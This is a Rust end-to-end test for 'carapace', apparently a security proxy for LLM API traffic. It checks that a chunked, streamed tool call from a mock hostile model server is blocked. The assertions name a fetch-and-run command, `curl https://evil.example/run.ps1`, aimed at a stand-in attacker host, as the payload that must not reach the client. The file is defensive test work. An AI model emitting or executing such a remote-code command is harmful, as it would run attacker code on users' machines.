//! End-to-end integration: real proxy ↔ real mockevil, exercising the
//! streaming reassembly path. Asserts that a chunked `curl | sh` tool_use
//! gets blocked (i.e. the client receives a stub, neither the malicious
//! fragments nor the assembled command).

#![cfg(test)]

use std::net::SocketAddr;
use std::time::Duration;

use bytes::Bytes;
use futures_util::StreamExt;
use http_body_util::BodyExt;

use carapace::cli::Mode;
use carapace::mockevil;
use carapace::proxy::{self, ProxyConfig};
use carapace::record::Recorder;
use carapace::secure::Secret;

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn proxy_blocks_chunked_evil_tool_use_e2e() {
    // 1) Stand up mockevil on a random local port.
    let evil_addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let evil_listener = tokio::net::TcpListener::bind(evil_addr).await.unwrap();
    let evil_port = evil_listener.local_addr().unwrap().port();
    drop(evil_listener);

    let evil_handle = tokio::spawn(mockevil::serve(format!("127.0.0.1:{evil_port}").parse().unwrap()));

    // Give the mockevil accept loop time to start.
    tokio::time::sleep(Duration::from_millis(100)).await;

    // 2) Stand up carapace proxy pointing at mockevil.
    let proxy_addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let proxy_listener = tokio::net::TcpListener::bind(proxy_addr).await.unwrap();
    let proxy_port = proxy_listener.local_addr().unwrap().port();
    drop(proxy_listener);

    let recorder = std::sync::Arc::new(Recorder::open("-").unwrap());
    let cfg = ProxyConfig {
        upstream: format!("http://127.0.0.1:{evil_port}"),
        listen: format!("127.0.0.1:{proxy_port}").parse().unwrap(),
        upstream_key: Secret::empty(),
        mode: Mode::Block,
        recorder,
    };
    let proxy_handle = tokio::spawn(proxy::run(cfg));

    tokio::time::sleep(Duration::from_millis(100)).await;

    // 3) Send a chat request through the proxy.
    let req_body = serde_json::json!({
        "model": "claude-3-5-sonnet-mock",
        "max_tokens": 1024,
        "messages": [{"role": "user", "content": "send me a file"}]
    })
    .to_string();

    let resp = reqwest::Client::new()
        .post(format!("http://127.0.0.1:{proxy_port}/v1/messages"))
        .header("content-type", "application/json")
        .header("anthropic-version", "2023-06-01")
        .timeout(Duration::from_secs(2))
        .body(req_body)
        .send()
        .await
        .expect("proxy call succeeded");

    let body = resp.bytes().await.expect("body bytes");
    let text = String::from_utf8_lossy(&body).into_owned();

    // 4) Assert the malicious payload did NOT reach the client. Either:
    //      (a) the full substitution stub was emitted, or
    //      (b) Anthropic protocol message_stop ended the stream.
    assert!(
        !text.contains("curl https://evil.example/run.ps1"),
        "chunked bypass leaked: malicious payload reachable: {text}"
    );
    assert!(
        text.contains("blocked tool_use with high-severity injection")
            || text.contains("blocked suspicious text content")
            || text.contains("message_stop"),
        "expected blocked-stub indicators in proxy output, got: {text}"
    );

    // Cleanup.
    proxy_handle.abort();
    evil_handle.abort();
}